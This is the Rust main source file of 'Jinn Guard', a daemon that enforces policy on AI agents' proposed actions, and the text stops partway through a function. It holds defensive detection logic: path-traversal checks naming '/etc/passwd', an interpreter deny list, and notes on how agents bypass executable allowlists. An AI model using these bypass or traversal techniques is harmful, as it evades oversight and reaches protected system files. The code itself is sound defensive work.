// ts_cli/src/main.rs — Jinn Guard Daemon
//
// Architecture:
//   • UDS server: receives framed HMAC-signed ClientProposal packets
//   • MCP gateway: HTTP/1.1 TCP proxy for JSON-RPC tool calls
//   • Policy hot-reload: SIGHUP + optional periodic fetch from remote server
//   • eBPF LSM: optional kernel telemetry (feature = "kernel_telemetry")

#![cfg(target_os = "linux")]

pub mod ebpf_monitor;
pub mod explainability;
#[cfg(feature = "fleet")]
pub mod fleet_policy;
pub mod governance;
pub mod mcp_gateway;
pub mod metrics;
pub mod system_immunity;

use anyhow::{Context as AnyhowContext, Result};
use clap::Parser;
use governance::{
    AgentLineage, AuditLogger, CapabilityProfile, ClientProposal, CombinedSemanticService,
    ConstraintSet, ExecutionBroker, ExecutionRequest, IntentClass, LineageRegistry,
    ObservationRecord, PolicyDecision, ProposedAction, RiskAssessment, SemanticAnalysisService,
    SemanticIntent,
};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::{HashMap, HashSet};
use std::fs;
use std::os::unix::fs::{FileTypeExt, PermissionsExt};
use std::os::unix::io::AsRawFd;
use std::path::Path;
use std::process::Command;
use std::sync::{Arc, Mutex};
#[cfg(feature = "kernel_telemetry")]
use std::thread;
use std::time::Duration;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWriteExt};
use tokio::net::UnixListener;
use tokio::signal::unix::{signal, SignalKind};
use tokio::time::timeout;
use ts_checker::PolicyEngine;
use ts_wire::{BodyReject, FrameReject, SignedEnvelope};
use z3::{Config as Z3Config, Context as Z3Context};

use ebpf_monitor::{LsmRequest, LsmRequestType, Verdict};

#[cfg(feature = "kernel_telemetry")]
use ebpf_monitor::LsmPathResolutionCache;

// TelemetryStore maps kernel PID → list of kernel telemetry events
// Feature-gated: in non-kernel-telemetry builds this is a stub.
pub(crate) type TelemetryStore = Arc<Mutex<HashMap<u32, Vec<KernelTelemetryEvent>>>>;

#[derive(Debug, Clone)]
pub(crate) struct KernelTelemetryEvent {
    #[allow(dead_code)]
    pub event_type: String,
    #[allow(dead_code)]
    pub resource: String,
    pub denied: bool,
}

// ---------------------------------------------------------------------------
// CLI arguments
// ---------------------------------------------------------------------------

#[derive(Parser, Debug, Clone)]
#[command(
    name = "jinnguard",
    version,
    about = "Jinn Guard — Enterprise AI Agent Firewall"
)]
struct CliArgs {
    /// UNIX domain socket path
    #[arg(long, default_value = "/run/jinnguard/jinnguard.sock")]
    socket_path: String,
    /// Optional socket permissions as an octal mode such as 0660 or 0770
    #[arg(long)]
    socket_mode: Option<String>,
    /// Lineage registry persistence file
    #[arg(long, default_value = "/var/lib/jinnguard/lineage.json")]
    lineage_file: String,
    /// Audit log path
    #[arg(long, default_value = "/var/log/jinnguard/audit.log")]
    audit_log: String,
    /// Policy YAML file
    #[arg(long, default_value = "/etc/jinnguard/policy.yaml")]
    policy_file: String,
    /// HMAC secret file (raw bytes)
    #[arg(long, env = "JINNGUARD_SECRET_FILE")]
    secret_file: Option<String>,
    /// Allow anonymous agents regardless of policy setting
    #[arg(long, default_value_t = false)]
    allow_anonymous: bool,
    /// MCP gateway TCP port
    #[arg(long, default_value_t = 4750)]
    mcp_port: u16,
    /// MCP upstream server address
    #[arg(long, default_value = "127.0.0.1:3000")]
    mcp_upstream: String,
    /// MCP gateway mTLS: PEM server certificate chain. Set together with
    /// --mcp-tls-key and --mcp-tls-ca to require client certificates (mTLS);
    /// when unset the gateway listens in plaintext.
    #[arg(long)]
    mcp_tls_cert: Option<String>,
    /// MCP gateway mTLS: PEM server private key (pairs with --mcp-tls-cert).
    #[arg(long)]
    mcp_tls_key: Option<String>,
    /// MCP gateway mTLS: PEM CA bundle used to verify connecting clients.
    #[arg(long)]
    mcp_tls_ca: Option<String>,
    /// Remote policy server URL (HTTPS)
    #[arg(long)]
    policy_server: Option<String>,
    /// Policy refresh interval in seconds
    #[arg(long, default_value_t = 60)]
    policy_refresh_secs: u64,
    /// Signed fleet-policy bundle URL (open-core integration hook). The daemon
    /// pulls a signed, versioned `PolicyBundle`, verifies its HMAC-SHA256
    /// signature, enforces rollback protection, and hot-reloads it. The bundle
    /// *server* (the fleet control plane) is external and pluggable — it is
    /// deliberately not part of this open agent; this flag is the stable
    /// integration point a fleet manager connects to. Compiled only with the
    /// `fleet` feature (part of the `enterprise` build).
    #[cfg(feature = "fleet")]
    #[arg(long)]
    fleet_policy_url: Option<String>,
    /// Optional separate key file used to verify fleet bundle signatures.
    /// Defaults to the admission secret (`--secret-file`) when unset.
    #[cfg(feature = "fleet")]
    #[arg(long)]
    fleet_secret_file: Option<String>,
    /// Optional path to cache the last verified fleet bundle, for offline
    /// restart (the agent keeps enforcing the cached policy if the control
    /// plane is unreachable).
    #[cfg(feature = "fleet")]
    #[arg(long)]
    fleet_policy_cache: Option<String>,
}

// ---------------------------------------------------------------------------
// Policy configuration (loaded from YAML)
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct AgentNodePolicy {
    pub id: String,
    pub privilege_tier: u32,
    #[serde(default)]
    pub max_sequence_quota: u64,
    #[serde(default)]
    pub allowed_intents: Vec<String>,
    #[serde(default)]
    pub allowed_executables: Vec<String>,
    #[serde(default)]
    pub denied_write_paths: Vec<String>,
    #[serde(default)]
    pub denied_unlink_paths: Vec<String>,
    #[serde(default)]
    pub denied_dns_domains: Vec<String>,
    #[serde(default)]
    pub invariants: Vec<String>,
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
pub struct NetworkPolicy {
    #[serde(default)]
    pub default_deny: bool,
    #[serde(default)]
    pub allowed_ips: Vec<String>,
    #[serde(default)]
    pub denied_ips: Vec<String>,
    #[serde(default)]
    pub allowed_unix_sockets: Vec<String>,
    /// #56: when true, governed-scope AF_UNIX connects are deny-by-default —
    /// only `allowed_unix_sockets` (plus the Jinn Guard control socket, always
    /// permitted for anti-lockout) may be reached. Independent of `default_deny`.
    #[serde(default)]
    pub unix_default_deny: bool,
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
pub struct RuntimePolicy {
    #[serde(default)]
    pub deny_root_peers: bool,
    #[serde(default)]
    pub allowed_peer_uids: Vec<u32>,
    #[serde(default)]
    pub require_brokered_execution: bool,
    #[serde(default)]
    pub require_sandbox_namespace: bool,
}

#[derive(Debug, Clone)]
pub(crate) struct PolicyConfig {
    pub upper_safety_boundary: f64,
    pub minimum_trust_score: f64,
    pub agent_nodes: HashMap<String, AgentNodePolicy>,
    pub deny_anonymous_agents: bool,
    pub allow_anonymous_override: bool,
    #[allow(dead_code)]
    pub network_policy: NetworkPolicy,
    pub runtime_policy: RuntimePolicy,
    #[allow(dead_code)]
    pub fleet_policy_min_version: u64,
    #[allow(dead_code)]
    pub accept_cross_machine_lineage: bool,
    /// Decoy ("canary") resource identifiers. A governed proposal that references
    /// any of these honeytokens trips the tripwire and is denied before the
    /// allowlist is consulted — no legitimate intent ever names a canary, so a
    /// single hit is treated as a compromise/probe signal.
    pub canary_resources: Vec<String>,
}

#[derive(Debug, Deserialize)]
struct PolicyYaml {
    #[serde(default = "default_ceiling")]
    global_safety_ceiling: f64,
    #[serde(default)]
    agent_nodes: Vec<AgentNodePolicy>,
    #[serde(default)]
    deny_anonymous: bool,
    #[serde(default)]
    deny_anonymous_agents: bool,
    #[serde(default)]
    network_policy: NetworkPolicy,
    #[serde(default)]
    runtime_policy: RuntimePolicy,
    #[serde(default)]
    fleet_policy_min_version: u64,
    #[serde(default)]
    accept_cross_machine_lineage: bool,
    #[serde(default)]
    enforcement_scope: EnforcementScopeYaml,
    /// Decoy resource identifiers watched by the canary tripwire (WS3).
    #[serde(default)]
    canary_resources: Vec<String>,
}

#[derive(Debug, Default, Deserialize)]
struct EnforcementScopeYaml {
    /// Absolute path prefixes that Jinn Guard governs in addition to the
    /// built-in test scope. Base-system prefixes are rejected at install time.
    #[serde(default)]
    governed_path_prefixes: Vec<String>,
}

fn default_ceiling() -> f64 {
    95.0
}

fn policy_config_from_yaml(yaml: PolicyYaml, allow_anonymous_override: bool) -> PolicyConfig {
    let agent_nodes: HashMap<String, AgentNodePolicy> = yaml
        .agent_nodes
        .into_iter()
        .map(|n| (n.id.clone(), n))
        .collect();
    PolicyConfig {
        upper_safety_boundary: yaml.global_safety_ceiling,
        minimum_trust_score: 100.0 - yaml.global_safety_ceiling,
        agent_nodes,
        // Support both field names for compatibility
        deny_anonymous_agents: yaml.deny_anonymous_agents || yaml.deny_anonymous,
        allow_anonymous_override,
        network_policy: yaml.network_policy,
        runtime_policy: yaml.runtime_policy,
        fleet_policy_min_version: yaml.fleet_policy_min_version,
        accept_cross_machine_lineage: yaml.accept_cross_machine_lineage,
        canary_resources: yaml.canary_resources,
    }
}

fn parse_policy_content(content: &str, allow_anonymous_override: bool) -> Result<PolicyConfig> {
    let yaml = serde_yaml::from_str::<PolicyYaml>(content).context("invalid policy YAML")?;
    let scope = yaml.enforcement_scope.governed_path_prefixes.clone();
    let policy = policy_config_from_yaml(yaml, allow_anonymous_override);
    // Sync the process-wide enforcement scope only after a successful parse. A
    // malformed hot-reload must keep the last good active policy and scope.
    set_governed_scope_prefixes(&scope);
    Ok(policy)
}

fn try_load_policy_from_path(
    policy_file: &str,
    allow_anonymous_override: bool,
) -> Result<PolicyConfig> {
    let content = fs::read_to_string(policy_file)
        .with_context(|| format!("failed to read policy file {policy_file:?}"))?;
    parse_policy_content(&content, allow_anonymous_override)
}

fn load_policy_from_path(policy_file: &str) -> PolicyConfig {
    if let Ok(policy) = try_load_policy_from_path(policy_file, false) {
        return policy;
    }
    // No readable/valid policy: clear any previously-installed governed scope so
    // startup fallback preserves historical local-dev behavior without carrying
    // a stale scope from an earlier in-process test.
    set_governed_scope_prefixes(&[]);
    PolicyConfig {
        upper_safety_boundary: 75.0,
        minimum_trust_score: 25.0,
        agent_nodes: HashMap::new(),
        deny_anonymous_agents: false,
        allow_anonymous_override: false,
        network_policy: NetworkPolicy::default(),
        runtime_policy: RuntimePolicy::default(),
        fleet_policy_min_version: 0,
        accept_cross_machine_lineage: false,
        canary_resources: Vec::new(),
    }
}

/// Parse policy YAML *content* (e.g., the `policy_yaml` field of a verified
/// fleet bundle) into a `PolicyConfig`, applying the same enforcement-scope
/// sync as a file load. Returns `None` when the content is not valid policy
/// YAML, so a malformed push leaves the current policy untouched.
#[cfg(feature = "fleet")]
fn parse_policy_yaml(content: &str, allow_anonymous: bool) -> Option<PolicyConfig> {
    parse_policy_content(content, allow_anonymous).ok()
}

fn ensure_control_socket_allowlist(policy: &mut PolicyConfig, socket_path: &str) {
    let socket_path = socket_path.trim();
    if socket_path.is_empty() {
        return;
    }
    if !policy
        .network_policy
        .allowed_unix_sockets
        .iter()
        .any(|allowed| allowed == socket_path)
    {
        policy
            .network_policy
            .allowed_unix_sockets
            .push(socket_path.to_string());
    }
}

// ---------------------------------------------------------------------------
// Runtime secret
// ---------------------------------------------------------------------------

pub(crate) fn get_runtime_secret() -> Result<Vec<u8>> {
    std::env::var("JINN_GUARD_SECRET")
        .map(|s| s.into_bytes())
        .map_err(|_| anyhow::anyhow!("CRITICAL: JINN_GUARD_SECRET register is uninitialized."))
}

fn load_secret_from_file(path: Option<&str>) -> Vec<u8> {
    if let Some(path) = path {
        if let Ok(bytes) = fs::read(path) {
            // Strip trailing whitespace (newlines from text editors)
            let trimmed = bytes
                .iter()
                .rposition(|&b| b != b'\n' && b != b'\r' && b != b' ')
                .map(|i| &bytes[..=i])
                .unwrap_or(&bytes);
            return trimmed.to_vec();
        }
    }
    // Fall back to env var / kernel keyring-backed runtime secret.
    get_runtime_secret().unwrap_or_else(|_| {
        exit_codes::fatal(
            exit_codes::EX_CONFIG,
            "SECRET_MISSING",
            "No HMAC secret. Use --secret-file or configure the kernel keyring.",
        )
    })
}

// ---------------------------------------------------------------------------
// Wire decoding (frame + signed envelope) lives in the `ts_wire` crate so the
// externally reachable parsers can be fuzzed in isolation; the daemon calls
// them below. See ts_wire::{decode_frame_header, classify_frame_header,
// parse_body, verify_envelope}.
// ---------------------------------------------------------------------------

/// Upper bound on remembered replay nonces. At ~40 bytes/entry this caps the
/// replay cache near ~40 MB; the effective replay window stays at the last
/// MAX_REPLAY_ENTRIES accepted proposals — far beyond any in-flight reuse.
const MAX_REPLAY_ENTRIES: usize = 1 << 20;

/// Bounded replay cache (JG-RT-002). Remembers recently-seen
/// `(agent, sequence_counter)` pairs so a replayed proposal is rejected, while
/// capping memory so a long-lived — or authenticated-but-hostile — client cannot
/// grow it without bound. At capacity the oldest nonce is evicted (FIFO).
struct ReplayGuard {
    seen: HashSet<(String, u64)>,
    order: std::collections::VecDeque<(String, u64)>,
    cap: usize,
}

impl ReplayGuard {
    fn with_capacity(cap: usize) -> Self {
        Self {
            seen: HashSet::new(),
            order: std::collections::VecDeque::new(),
            cap: cap.max(1),
        }
    }

    /// Record a nonce. Returns `true` if it is NEW (not a replay), `false` if it
    /// has been seen within the current bounded window.
    fn observe(&mut self, key: (String, u64)) -> bool {
        if self.seen.contains(&key) {
            return false;
        }
        if self.order.len() >= self.cap {
            if let Some(evicted) = self.order.pop_front() {
                self.seen.remove(&evicted);
            }
        }
        self.seen.insert(key.clone());
        self.order.push_back(key);
        true
    }

    #[cfg(test)]
    fn len(&self) -> usize {
        debug_assert_eq!(self.seen.len(), self.order.len());
        self.order.len()
    }
}

fn runtime_policy_denial(
    runtime_policy: &RuntimePolicy,
    proposal: &ClientProposal,
    observation: &ObservationRecord,
    execute_requested: bool,
) -> Option<String> {
    if runtime_policy.deny_root_peers && observation.uid == 0 {
        return Some("peer_uid_0_denied".to_string());
    }

    if !runtime_policy.allowed_peer_uids.is_empty()
        && !runtime_policy.allowed_peer_uids.contains(&observation.uid)
    {
        return Some(format!("peer_uid_not_allowed:{}", observation.uid));
    }

    if runtime_policy.require_brokered_execution
        && proposal.proposed_action.is_some()
        && !execute_requested
    {
        return Some("brokered_execution_required".to_string());
    }

    if runtime_policy.require_sandbox_namespace {
        let self_pid_ns = governance::get_namespace_inode(std::process::id(), "pid");
        let self_net_ns = governance::get_namespace_inode(std::process::id(), "net");

        let peer_pid_ns = match observation.namespace_pid_inode {
            Some(ns) => ns,
            None => return Some("peer_pid_namespace_unobserved".to_string()),
        };
        let peer_net_ns = match observation.namespace_net_inode {
            Some(ns) => ns,
            None => return Some("peer_net_namespace_unobserved".to_string()),
        };

        if self_pid_ns == Some(peer_pid_ns) {
            return Some("peer_not_pid_sandboxed".to_string());
        }
        if self_net_ns == Some(peer_net_ns) {
            return Some("peer_not_network_sandboxed".to_string());
        }
    }

    None
}

fn execute_broker_action(action: &ProposedAction) -> serde_json::Value {
    match action {
        ProposedAction::ShellCommand { command } => {
            match Command::new("/bin/sh").arg("-c").arg(command).output() {
                Ok(output) => serde_json::json!({
                    "executed": output.status.success(),
                    "exit_code": output.status.code(),
                    "stdout": String::from_utf8_lossy(&output.stdout),
                    "stderr": String::from_utf8_lossy(&output.stderr),
                }),
                Err(err) => serde_json::json!({
                    "executed": false,
                    "error": err.to_string(),
                }),
            }
        }
        ProposedAction::FileWrite { path, contents } => match fs::write(path, contents) {
            Ok(()) => serde_json::json!({
                "executed": true,
                "path": path,
                "bytes_written": contents.len(),
            }),
            Err(err) => serde_json::json!({
                "executed": false,
                "path": path,
                "error": err.to_string(),
            }),
        },
        ProposedAction::NetworkRequest { method, url } => serde_json::json!({
            "executed": false,
            "method": method,
            "url": url,
            "error": "broker_network_request_execution_not_implemented",
        }),
    }
}

fn parse_socket_mode(raw: &str) -> Result<u32> {
    let trimmed = raw.trim();
    let without_prefix = trimmed.strip_prefix("0o").unwrap_or(trimmed);
    u32::from_str_radix(without_prefix, 8)
        .map_err(|err| anyhow::anyhow!("invalid --socket-mode {raw:?}: {err}"))
}

fn remove_stale_unix_socket(socket_path: &str) -> Result<()> {
    let path = Path::new(socket_path);
    let metadata = match fs::symlink_metadata(path) {
        Ok(metadata) => metadata,
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(err) => return Err(err.into()),
    };

    if !metadata.file_type().is_socket() {
        anyhow::bail!(
            "refusing to remove non-socket at --socket-path {}",
            path.display()
        );
    }

    fs::remove_file(path)?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Policy decision (mid-band CONSTRAIN + hard ceiling)
// ---------------------------------------------------------------------------

pub(crate) fn policy_decision(
    assessment: &RiskAssessment,
    policy: &PolicyConfig,
) -> PolicyDecision {
    // Fail closed on non-finite risk/trust: a NaN compares false against every
    // bound, so without this guard a NaN `fused_risk` would slip past the
    // ceiling check below and be ALLOWed. Non-finite values never represent a
    // safe action, so they are denied.
    if !assessment.fused_risk.is_finite() || !assessment.trust_score.is_finite() {
        return PolicyDecision::deny("non_finite_risk_signal", assessment);
    }
    // Hard deny: risk above ceiling or trust below floor.
    if assessment.fused_risk > policy.upper_safety_boundary {
        return PolicyDecision::deny("risk_ceiling_exceeded", assessment);
    }
    if assessment.trust_score < policy.minimum_trust_score {
        return PolicyDecision::deny("trust_floor_breached", assessment);
    }
    // CONSTRAIN band: 40%–75% of the safety ceiling.
    let constrain_lower = policy.upper_safety_boundary * 0.40;
    let constrain_upper = policy.upper_safety_boundary * 0.75;
    if assessment.fused_risk >= constrain_lower && assessment.fused_risk < constrain_upper {
        let constraints = ConstraintSet {
            redact_output: assessment.fused_risk >= constrain_upper * 0.85,
            rate_limit_rps: Some(5),
            allowed_network_destinations: vec![],
            output_byte_limit: Some(65_536),
        };
        return PolicyDecision::constrain("mid_band_risk_constrained", assessment, constraints);
    }
    PolicyDecision::allow(assessment)
}

pub(crate) fn is_enforcement_target(path: &str) -> bool {
    path_is_governed(path)
}

pub(crate) fn is_path_in_test_scope(path: &str) -> bool {
    let path = path.trim();
    if path.is_empty() {
        return false;
    }

    if path.starts_with("/usr/")
        || path.starts_with("/bin/")
        || path.starts_with("/lib/")
        || path.starts_with("/etc/")
    {
        return false;
    }

    path.starts_with("/tmp/jinnguard-test/")
        || path.starts_with("/var/tmp/jinnguard-test/")
        || home_jinnguard_test_path(path)
}

fn is_protected_system_path(path: &str) -> bool {
    let path = path.trim();
    path.starts_with("/etc/")
        || path.starts_with("/sys/")
        || path.starts_with("/proc/")
        || path.starts_with("/root/")
        || path.starts_with("/boot/")
}

// Exercised by the kernel_telemetry LSM verdict path and unit tests; dead in
// the default user-space-only bin build.
#[allow(dead_code)]
fn is_trusted_process(request: &LsmRequest) -> bool {
    let path = request.process_path.as_deref().unwrap_or("");

    path.starts_with("/usr/bin/cargo")
        || path.starts_with("/usr/bin/rustc")
        || path.starts_with("/usr/bin/bash")
        || path.starts_with("/bin/bash")
        || path.starts_with("/bin/sh")
        || path.starts_with("/usr/bin/dash")
        || path.starts_with("/bin/dash")
        || path.starts_with("/usr/bin/env")
        || path.starts_with("/usr/bin/patch")
        || path.starts_with("/bin/patch")
}

fn home_jinnguard_test_path(path: &str) -> bool {
    let Some(rest) = path.strip_prefix("/home/") else {
        return false;
    };
    let Some((_user, suffix)) = rest.split_once('/') else {
        return false;
    };
    suffix.starts_with("jinnguard-test/")
}

// ---------------------------------------------------------------------------
// Operator-configured enforcement scope (M3).
//
// The built-in scope (`is_path_in_test_scope`) only governs the test sandbox,
// which is why kernel enforcement was effectively a no-op outside tests.
// Operators extend governance to real agent working roots via policy
// `enforcement_scope.governed_path_prefixes`. Two independent guards make it
// structurally impossible to widen enforcement onto the host's own critical
// paths (anti-lockout): forbidden prefixes are dropped when the scope is
// installed, AND base-system paths are re-excluded at every lookup. The model
// is additive — an empty config preserves the previous behavior exactly.
// ---------------------------------------------------------------------------

static GOVERNED_SCOPE_PREFIXES: std::sync::OnceLock<std::sync::RwLock<Vec<String>>> =
    std::sync::OnceLock::new();

fn governed_scope_cell() -> &'static std::sync::RwLock<Vec<String>> {
    GOVERNED_SCOPE_PREFIXES.get_or_init(|| std::sync::RwLock::new(Vec::new()))
}

/// Base-system locations that may never be placed under enforcement scope.
fn is_base_system_path(path: &str) -> bool {
    let p = path.trim();
    const DIRS: &[&str] = &[
        "/usr", "/bin", "/sbin", "/lib", "/lib64", "/etc", "/boot", "/sys", "/proc", "/dev", "/run",
    ];
    DIRS.iter()
        .any(|d| p == *d || p.starts_with(&format!("{d}/")))
}

/// A governed-scope prefix is rejected if it is relative, empty, or would place
/// a base-system path under enforcement.
fn is_forbidden_scope_prefix(prefix: &str) -> bool {
    let trimmed = prefix.trim();
    let normalized = trimmed.trim_end_matches('/');
    normalized.is_empty() || !trimmed.starts_with('/') || is_base_system_path(normalized)
}

/// Install operator-configured governed prefixes, dropping any that are
/// relative, empty, or under a base-system path. Returns the prefixes actually
/// installed. Called on initial load and on every hot-reload via
/// `load_policy_from_path`, so the global always matches the active policy.
pub(crate) fn set_governed_scope_prefixes(raw: &[String]) -> Vec<String> {
    let mut installed = Vec::new();
    for prefix in raw {
        if is_forbidden_scope_prefix(prefix) {
            eprintln!(
                "[policy] rejecting enforcement_scope prefix {prefix:?}: base-system or \
                 malformed paths cannot be governed (anti-lockout)"
            );
            continue;
        }
        installed.push(prefix.trim().trim_end_matches('/').to_string());
    }
    let mut guard = governed_scope_cell().write().unwrap();
    *guard = installed.clone();
    installed
}

fn path_matches_governed_prefix(path: &str) -> bool {
    let path = path.trim();
    if path.is_empty() {
        return false;
    }
    let guard = governed_scope_cell().read().unwrap();
    guard
        .iter()
        .any(|prefix| path == prefix || path.starts_with(&format!("{prefix}/")))
}

/// True when `path` is subject to Jinn Guard enforcement: the built-in test
/// scope OR an operator-configured governed prefix. Base-system paths are never
/// governed, regardless of configuration — this is the second anti-lockout
/// guard and it dominates the operator-supplied prefix list.
pub(crate) fn path_is_governed(path: &str) -> bool {
    if is_path_in_test_scope(path) {
        return true;
    }
    if is_base_system_path(path) || is_protected_system_path(path) {
        return false;
    }
    path_matches_governed_prefix(path)
}

// ---------------------------------------------------------------------------
// Adaptive enforcement with deterministic floors (M6).
//
// Repeat offenders are progressively tightened: each hard denial raises an
// agent's effective risk on subsequent requests, trending it toward
// CONSTRAIN/DENY. The adaptation is deterministic (a pure function of the
// offense count), bounded (a hard cap so it cannot run away), and TIGHTEN-ONLY
// (the penalty is non-negative and never decays, so the system can never adapt
// its way into *less* enforcement). It applies only to agent risk scoring on
// the authenticated proposal path; operator-immune and out-of-scope decisions
// are made earlier and are never affected.
// ---------------------------------------------------------------------------

static AGENT_OFFENSE_COUNTS: std::sync::OnceLock<std::sync::Mutex<HashMap<String, u32>>> =
    std::sync::OnceLock::new();

/// Risk added per prior offense, and the hard ceiling on adaptive penalty.
const ADAPTIVE_PENALTY_PER_OFFENSE: f64 = 8.0;
const ADAPTIVE_PENALTY_CAP: f64 = 40.0;

fn agent_offense_cell() -> &'static std::sync::Mutex<HashMap<String, u32>> {
    AGENT_OFFENSE_COUNTS.get_or_init(|| std::sync::Mutex::new(HashMap::new()))
}

/// Deterministic, bounded, non-negative adaptive risk penalty for an agent's
/// prior offenses. Same offense count always yields the same penalty, the value
/// never decreases as offenses rise, and it is capped so adaptation cannot
/// escalate without bound.
fn adaptive_risk_penalty(offenses: u32) -> f64 {
    (offenses as f64 * ADAPTIVE_PENALTY_PER_OFFENSE).min(ADAPTIVE_PENALTY_CAP)
}

fn current_agent_offenses(agent_key: &str) -> u32 {
    *agent_offense_cell()
        .lock()
        .unwrap()
        .get(agent_key)
        .unwrap_or(&0)
}

/// Record one hard denial against an agent (a tighten-only signal). Returns the
/// new cumulative offense count.
fn record_agent_offense(agent_key: &str) -> u32 {
    let mut guard = agent_offense_cell().lock().unwrap();
    let count = guard.entry(agent_key.to_string()).or_insert(0);
    *count = count.saturating_add(1);
    *count
}

/// Apply the adaptive reputation penalty to an assessment in place. Tighten-only:
/// it can only raise risk and lower trust, never the reverse.
fn apply_adaptive_penalty(assessment: &mut RiskAssessment, offenses: u32) {
    let penalty = adaptive_risk_penalty(offenses);
    if penalty <= 0.0 {
        return;
    }
    assessment.observed_risk = (assessment.observed_risk + penalty).min(99.0);
    assessment.fused_risk = assessment
        .fused_risk
        .max(assessment.observed_risk)
        .min(99.0);
    assessment.trust_score = (100.0 - assessment.fused_risk).clamp(0.0, 100.0);
    assessment
        .reasons
        .push(format!("adaptive_reputation_penalty:offenses={offenses}"));
}

pub(crate) fn protected_resource_reference(value: &str) -> bool {
    let value = value.trim();
    if value.is_empty() {
        return false;
    }

    for prefix in ["/etc", "/usr", "/bin", "/lib"] {
        if value == prefix
            || value
                .strip_prefix(prefix)
                .is_some_and(|suffix| suffix.starts_with('/'))
        {
            return true;
        }
    }

    // Catch explicit traversal attempts such as ../../../etc/passwd in broker
    // proposals without trying to normalize arbitrary shell syntax.
    value.starts_with("etc/")
        || value.starts_with("usr/")
        || value.starts_with("bin/")
        || value.starts_with("lib/")
        || value.contains("/etc/")
        || value.contains("/usr/")
        || value.contains("/bin/")
        || value.contains("/lib/")
}

pub(crate) fn intent_is_dangerous(intent: &str) -> bool {
    let intent = intent.to_ascii_lowercase();
    [
        "write", "delete", "unlink", "remove", "exec", "shell", "command", "spawn", "run",
        "network", "connect",
    ]
    .iter()
    .any(|needle| intent.contains(needle))
}

// ---------------------------------------------------------------------------
// Interpreter-bypass mitigation (M4 / JG-ADV-2026-001).
//
// An agent permitted to run one binary can smuggle arbitrary execution through
// an interpreter (sh -c, python -c, etc.). On the broker/proposal path we have
// the agent's identity and executable allowlist, so we can deny interpreter
// invocations that are not explicitly allowlisted. This does not touch the
// operator: it only applies to agents that already carry an executable
// allowlist (explicit governance); unconstrained agents are unaffected.
// ---------------------------------------------------------------------------

const KNOWN_INTERPRETERS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "ksh", "fish", "csh", "tcsh", "python", "python2", "python3",
    "perl", "ruby", "node", "nodejs", "php", "lua", "tclsh", "awk", "gawk", "Rscript", "pwsh",
];

fn binary_basename(token: &str) -> &str {
    Path::new(token.trim())
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or_else(|| token.trim())
}

/// If `token` names a known interpreter, return its basename.
fn interpreter_name(token: &str) -> Option<&'static str> {
    let base = binary_basename(token);
    KNOWN_INTERPRETERS.iter().copied().find(|i| *i == base)
}

/// Interpreter invoked by a proposed action, if any.
fn proposal_invoked_interpreter(action: &ProposedAction) -> Option<&'static str> {
    match action {
        ProposedAction::ShellCommand { command } => {
            command.split_whitespace().next().and_then(interpreter_name)
        }
        _ => None,
    }
}

/// Deny reason when a governed agent (one with an explicit executable
/// allowlist) invokes an interpreter that is not on that allowlist. Returns
/// `None` for unconstrained agents (no allowlist) or explicitly-allowed
/// interpreters.
fn interpreter_bypass_denied(
    node: Option<&AgentNodePolicy>,
    action: Option<&ProposedAction>,
) -> Option<String> {
    let node = node?;
    if node.allowed_executables.is_empty() {
        return None;
    }
    let interpreter = action.and_then(proposal_invoked_interpreter)?;
    let explicitly_allowed = node
        .allowed_executables
        .iter()
        .any(|allowed| allowed == interpreter || binary_basename(allowed) == interpreter);
    if explicitly_allowed {
        None
    } else {
        Some(format!("interpreter_not_allowed:{interpreter}"))
    }
}

fn proposed_action_references_protected_resource(action: &ProposedAction) -> bool {
    match action {
        ProposedAction::FileWrite { path, .. } => protected_resource_reference(path),
        ProposedAction::ShellCommand { command } => protected_resource_reference(command),
        ProposedAction::NetworkRequest { url, .. } => protected_resource_reference(url),
    }
}

fn json_references_protected_resource(value: &Value) -> bool {
    match value {
        Value::String(s) => protected_resource_reference(s),
        Value::Array(values) => values.iter().any(json_references_protected_resource),
        Value::Object(map) => map.values().any(json_references_protected_resource),
        _ => false,
    }
}

pub(crate) fn explicit_protected_resource_attack(
    intent: Option<&str>,
    proposed_action: Option<&ProposedAction>,
    raw_payload: Option<&Value>,
    resource_path: Option<&str>,
) -> Option<&'static str> {
    if proposed_action
        .as_ref()
        .is_some_and(|action| proposed_action_references_protected_resource(action))
    {
        return Some("protected_resource_proposed_action");
    }

    let dangerous_intent = intent.is_some_and(intent_is_dangerous);
    let protected_resource = resource_path.is_some_and(protected_resource_reference)
        || raw_payload.is_some_and(json_references_protected_resource);

    if dangerous_intent && protected_resource {
        return Some("protected_resource_intent");
    }

    None
}

pub(crate) fn requires_intent_aware_enforcement(
    proposal: &ClientProposal,
    raw_payload: &Value,
    risk_floor: f64,
) -> bool {
    proposal.proposed_action.is_some()
        || proposal
            .intent_name
            .as_deref()
            .is_some_and(intent_is_dangerous)
        || proposal
            .action_risk_score
            .is_some_and(|risk| risk >= risk_floor)
        || json_references_protected_resource(raw_payload)
}

fn proposal_enforcement_path<'a>(
    proposal: &'a ClientProposal,
    raw_payload: &'a Value,
    observation: &'a ObservationRecord,
) -> Option<&'a str> {
    if let Some(action) = proposal.proposed_action.as_ref() {
        match action {
            ProposedAction::ShellCommand { command } => {
                if !command.trim().is_empty() {
                    return Some(command.as_str());
                }
            }
            ProposedAction::FileWrite { path, .. } => {
                if !path.trim().is_empty() {
                    return Some(path.as_str());
                }
            }
            ProposedAction::NetworkRequest { .. } => {}
        }
    }

    for key in ["path", "resource", "target", "file_path", "executable"] {
        if let Some(path) = raw_payload
            .get(key)
            .and_then(|value| value.as_str())
            .filter(|value| !value.trim().is_empty())
        {
            return Some(path);
        }
    }

    observation.executable_path.as_deref()
}

fn outside_scope_assessment(path: &str) -> RiskAssessment {
    RiskAssessment {
        observed_risk: 0.0,
        semantic_risk: 0.0,
        topology_risk: 0.0,
        declared_risk: Some(0.0),
        fused_risk: 0.0,
        trust_score: 100.0,
        reasons: vec![format!("outside_enforcement_scope:{path}")],
    }
}

fn emit_daemon_decision_explanation(
    decision: &str,
    reason: &str,
    policy_name: &str,
    source: &str,
    proposal: Option<&ClientProposal>,
    agent_id: Option<&str>,
    assessment: Option<&RiskAssessment>,
) {
